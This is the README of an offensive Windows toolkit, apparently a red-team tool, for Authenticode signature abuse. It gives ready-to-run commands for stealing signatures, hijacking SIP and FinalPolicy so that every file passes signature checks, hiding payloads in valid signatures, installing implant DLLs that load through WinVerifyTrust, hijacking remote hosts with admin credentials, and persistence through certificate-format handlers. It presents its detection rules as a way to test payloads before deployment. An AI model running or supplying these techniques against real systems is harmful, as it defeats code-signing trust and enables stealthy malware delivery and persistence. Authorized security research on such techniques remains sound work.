# TrustMeBro

Authenticode signature manipulation toolkit for Red Team operations and security research. Covers signature stealing, metadata cloning, SIP hijacking across 19 file types, WinVerifyTrust FinalPolicy bypass, PKCS#7 payload embedding, SIP execution surface implants, and analyst-triggered persistence via OID handlers.

Available in Python (cross-platform) and C++ (Windows native).

## Repository Structure

```
TrustMeBro/
├── TrustMeBro/                         C++ native tool
│   ├── main.cpp                        Subcommand-based CLI
│   ├── steal.h                         Signature stealing, SIP hijack, FinalPolicy
│   ├── pkcs7_embed.h                   Zero-dependency ASN.1 DER embed/extract
│   └── TrustMeBro.inf                  INF-based SIP hijack (right-click Install)
├── SigStash/                           Payload extraction from signed PEs
│   ├── loader.cpp                      Argument-based loader (reads a carrier file)
│   └── stub.c                          Self-extracting stub (reads its own PE)
├── tools/
│   └── FormatGhost/                    CryptDllFormatObject persistence tool
│       ├── format_ghost.c              DLL template
│       ├── register.py                 Registry OID registration helper
│       ├── Makefile
│       └── README.md
├── detection/                          YARA and Sigma detection rules
├── experimental/
│   ├── publisher-spoof/                Publisher name spoofing research
│   └── dual-signerinfo/                Dual SignerInfo parser-divergence research
├── docs/
│   ├── SIP_COMPLETE_MAP.md             Full 19-GUID SIP reference
│   └── *.svg                           Technique diagrams
├── bin/                                Pre-compiled Windows binaries
├── TrustMeBro.py                       Python cross-platform tool
├── LICENSE
└── README.md
```

---

## How It Works

### SigFlip (CVE-2013-3900), for comparison
<p align="center">
  <img src="docs/01-sigflip.svg" alt="SigFlip embeds payload in certificate table padding" width="700"/>
</p>

### SigStash, Direct Mode
<p align="center">
  <img src="docs/02-sigstash-direct.svg" alt="SigStash embeds payload inside PKCS#7 DER unsignedAttrs" width="700"/>
</p>

### SigStash, Camouflage Mode
<p align="center">
  <img src="docs/03-sigstash-camouflage.svg" alt="SigStash wraps payload in fake SPC_NESTED_SIGNATURE" width="700"/>
</p>

---

## C++ Usage

Every subcommand supports `--clean` to reverse its own changes, `--dry-run` to preview without writing, and `-v` for verbose output. Every write operation prints an undo hint on completion.

### steal

Steal signature and metadata from a donor PE.

```cmd
TrustMeBro.exe steal explorer.exe agent.exe
TrustMeBro.exe steal explorer.exe agent.exe --clone
TrustMeBro.exe steal explorer.exe agent.exe --no-hijack
TrustMeBro.exe steal explorer.exe agent.exe --sip-types PE,VBScript,JScript
TrustMeBro.exe steal explorer.exe agent.exe --all-sips
TrustMeBro.exe steal --clean
TrustMeBro.exe steal explorer.exe agent.exe --dry-run
```

### hijack

Install SIP or FinalPolicy persistence on the local machine. Requires admin.

```cmd
:: SIP hijack (default: PE, PowerShell, MSI)
TrustMeBro.exe hijack --sip-types PE,PowerShell,MSI

:: SIP hijack (all 17 standard types)
TrustMeBro.exe hijack --sip-types all

:: SIP hijack with Smart App Control (Win11)
TrustMeBro.exe hijack --sip-types all --sac

:: All 19 SIP GUIDs
TrustMeBro.exe hijack --all-sips

:: FinalPolicy bypass (system-wide, all files pass signature checks)
TrustMeBro.exe hijack --finalpolicy

:: Custom trust provider GUID (evades detection rules on Authenticode GUID)
TrustMeBro.exe hijack --custom-provider {GUID}

:: WOW64-only (hijack 32-bit callers, leave 64-bit registry clean)
TrustMeBro.exe hijack --sip-types all --wow64-only

:: Reverse any hijack
TrustMeBro.exe hijack --clean
TrustMeBro.exe hijack --finalpolicy --clean
TrustMeBro.exe hijack --custom-provider {GUID} --clean

:: Preview without writing
TrustMeBro.exe hijack --sip-types all --dry-run
```

### embed

Embed payload into a signed PE's PKCS#7 signature. The Authenticode signature remains valid.

```cmd
TrustMeBro.exe embed payload.bin signed.exe output.exe
TrustMeBro.exe embed payload.bin signed.exe output.exe --camouflage
TrustMeBro.exe embed payload.bin signed.exe output.exe --oid 1.3.6.1.4.1.55555.1.1
TrustMeBro.exe embed payload.bin signed.exe output.exe --dry-run
```

### extract

Extract embedded payload from a signed PE.

```cmd
TrustMeBro.exe extract output.exe recovered.bin
TrustMeBro.exe extract output.exe recovered.bin --camouflage
```

### sip-exec

Install, remove, or list payload DLLs on the SIP execution surface. Installed DLLs load in any process that calls WinVerifyTrust.

Named GUID aliases: `pe`, `ps1`, `jscript`, `vbscript`, `wsf`, `cab`, `catalog`, `appx`, `appx-bundle`, `msi`, `ctl`, `esd`, `sac`

```cmd
:: Install implant (alias resolves to GUID, prints trigger extensions + affected processes)
TrustMeBro.exe sip-exec install --dll C:\Temp\implant.dll --guid pe
TrustMeBro.exe sip-exec install --dll C:\Temp\implant.dll --guid jscript

:: Remove implant
TrustMeBro.exe sip-exec remove --guid pe
TrustMeBro.exe sip-exec --clean --guid pe

:: List all registered SIP triggers
TrustMeBro.exe sip-exec list

:: Preview
TrustMeBro.exe sip-exec install --dll C:\Temp\implant.dll --guid pe --dry-run
```

### probe

Query local Code Integrity enforcement state. No writes. No admin required.

```cmd
TrustMeBro.exe probe
```

Output:
```
[*] Code Integrity Flags: 0x00000005

  CI Enabled:              YES
  Test-Signing:            no
  UMCI (User-Mode CI):     YES
  Debug Mode:              no
  Flight Signing:          no
  HVCI (Memory Integrity): no
  HVCI Strict:             no
  Smart App Control:       no
  Audit Mode:              no
```

### clean

Remove all persistence artifacts. Requires at least one scope flag.

```cmd
TrustMeBro.exe clean --sip                          :: Restore all SIP keys
TrustMeBro.exe clean --finalpolicy                  :: Restore FinalPolicy
TrustMeBro.exe clean --custom-provider {GUID}       :: Remove custom provider
TrustMeBro.exe clean --all                          :: SIP + FinalPolicy
TrustMeBro.exe clean --all --dry-run                :: Preview
```

---

## Python Usage

The Python tool uses the same subcommand names and flag names as C++. Remote operations use Impacket for registry access.

Requirements: Python 3.10+, `asn1crypto` (for embed/extract), `objcopy` (for metadata cloning), `impacket` (for remote hijack).

```bash
pip install asn1crypto
```

```bash
# Signature stealing
python3 TrustMeBro.py steal -s explorer.exe -t agent.exe
python3 TrustMeBro.py steal -s explorer.exe -t agent.exe --clone

# SIP hijack (remote via Impacket)
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --sip-types PE,VBScript,JScript
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --sip-types all
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --all-sips
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --sac

# FinalPolicy hijack
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --action finalpolicy
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --action finalpolicy-clean

# Custom trust provider
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --action custom-provider
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --action custom-provider-clean --provider-guid {GUID}

# WOW64-only
python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --wow64-only

# PKCS#7 payload embedding
python3 TrustMeBro.py embed -s signed.exe -p payload.bin -o output.exe
python3 TrustMeBro.py embed -s signed.exe -p payload.bin -o output.exe --camouflage
python3 TrustMeBro.py embed -s signed.exe -p payload.bin -o output.exe --signer-index 0

# Payload extraction
python3 TrustMeBro.py extract -s output.exe -o recovered.bin
python3 TrustMeBro.py extract -s output.exe -o recovered.bin --camouflage

# SIP execution surface
python3 TrustMeBro.py sip-exec --dll "C:\Temp\implant.dll"
python3 TrustMeBro.py sip-exec --dll "C:\Temp\implant.dll" --guid pe
```

### INF-based SIP Hijack

Quick local hijack without running the EXE:
```cmd
rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\TrustMeBro\TrustMeBro.inf
```

---

## SigStash (Payload Loader and Self-Extracting Stub)

Two tools for extracting embedded payloads from a carrier PE's PKCS#7 signature.

### Loader (`SigStash/loader.cpp`)

Takes a carrier PE path as an argument. Supports direct OID and camouflage mode.

```cmd
SigStashLoader.exe carrier.exe
SigStashLoader.exe carrier.exe --camouflage
SigStashLoader.exe carrier.exe --exec
```

### Self-Extracting Stub (`SigStash/stub.c`)

Reads its own PE from disk. Writes payload to `%TEMP%\sigstash_out.bin`. No arguments needed.

```
1. Compile stub (or stub_camo with -DCAMOUFLAGE_MODE=1)
2. Sign with osslsigncode or signtool
3. Embed: python3 TrustMeBro.py embed -s signed_stub.exe -p payload.bin -o final.exe
4. Run final.exe on target
```

---

## FormatGhost (Standalone Tool)

Standalone at `tools/FormatGhost/`. Registers a DLL as a `CryptDllFormatObject` handler for a custom OID. The DLL loads when `certutil -dump` or any cert UI parses a PE with that OID. Requires admin. Requires user interaction to trigger. See `tools/FormatGhost/README.md`.

---

## Experimental

Research prototypes. Not production-ready.

- `experimental/publisher-spoof/` generates self-signed certs with chosen CN for publisher name spoofing.
- `experimental/dual-signerinfo/` documents the kernel vs user-mode SignerInfo parser divergence (docs only, no code).

---

## Detection Rules

YARA and Sigma rules in `detection/`. Test your payloads against these before deployment.

| File | Format | Detects |
|---|---|---|
| `sip_hijack_registry.yar` | YARA | SIP hijack via DbgUiContinue redirect |
| `sip_hijack_gate1.yar` | YARA | SIP hijack gate-1 artifact |
| `sip_hijack_expanded.yar` | YARA | SIP hijack on script and package file types |
| `sip_hijack_registry_modify.sigma` | Sigma | SIP provider registry modification |
| `custom_provider_finalpolicy.sigma` | Sigma | FinalPolicy under non-standard action GUID |
| `shape2_dual_signerinfo.yar` | YARA | Dual SignerInfo in WIN_CERTIFICATE |
| `esbcache_bypass.yar` | YARA | ESBCACHE EA manipulation |
| `esbcache_bypass.sigma` | Sigma | Unsigned driver load via ESBCACHE |
| `b1_ffi_behavior.sigma` | Sigma | Driver service from root drive path |

---

## Building from Source

```bash
# TrustMeBro main tool
x86_64-w64-mingw32-g++ -std=c++17 -O2 -o bin/TrustMeBro.exe TrustMeBro/main.cpp -lshlwapi

# SigStash loader
x86_64-w64-mingw32-g++ -std=c++17 -O2 -o bin/SigStashLoader.exe SigStash/loader.cpp

# SigStash self-extracting stub
x86_64-w64-mingw32-gcc -O2 -s -o bin/SigStashStub.exe SigStash/stub.c -lkernel32
x86_64-w64-mingw32-gcc -O2 -s -DCAMOUFLAGE_MODE=1 -o bin/SigStashStubCamo.exe SigStash/stub.c -lkernel32

# FormatGhost DLL
cd tools/FormatGhost && make
```

No external dependencies for C++ tools.

---

## SIP GUID Reference

Full 19-GUID map with hijack results, handler DLLs, and file-type detection methods: [docs/SIP_COMPLETE_MAP.md](docs/SIP_COMPLETE_MAP.md)

---

## Disclaimer

This tool is for educational purposes and authorized security testing only. Misuse to attack systems without consent is illegal. The authors are not responsible for damage caused by this software.

## Credits

- [SigFlip](https://github.com/med0x2e/SigFlip) by med0x2e. Payload embedding via certificate table padding (CVE-2013-3900).
- [SignatureKid](https://github.com/dslee2022/SignatureKid) by David Lee. Signature stealing research.
- [MetaTwin](https://github.com/threatexpress/metatwin) by ThreatExpress. Binary metadata cloning.
- Matt Graeber. SIP and Trust Provider research documenting the WVT hijack attack surface.
